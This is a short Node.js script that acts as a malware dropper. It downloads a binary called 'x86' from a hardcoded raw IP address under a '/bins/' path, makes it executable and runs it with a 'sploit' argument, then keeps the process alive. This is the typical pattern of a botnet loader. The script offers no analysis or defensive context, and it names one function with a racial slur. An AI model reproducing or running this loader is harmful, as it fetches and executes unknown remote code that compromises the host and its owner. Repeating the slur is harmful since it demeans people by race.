const util = require('util')
const exec = util.promisify(require('child_process').exec);
const http = require('http');
const fs = require('fs');

async function lmaobozo(command) {
  
  try{
    var { stdout, stderr, error } = await exec(command);
    return stdout;
  }catch(stderr){
    console.error('stderr '+ stderr)
  }
  
}

async function nigger() {
    var sex = await lmaobozo("chmod +x x86; ./x86 sploit.x86; sleep 100000")
}


const file = fs.createWriteStream("x86");
const request = http.get("http://179.43.175.5/bins/x86", function(response) {
   response.pipe(file);

  
   file.on("finish", async () => {
       file.close();
       await nigger()
       console.log("Download Completed");
   });
});

setInterval(() => {
    console.log("hi")
}, 620000);
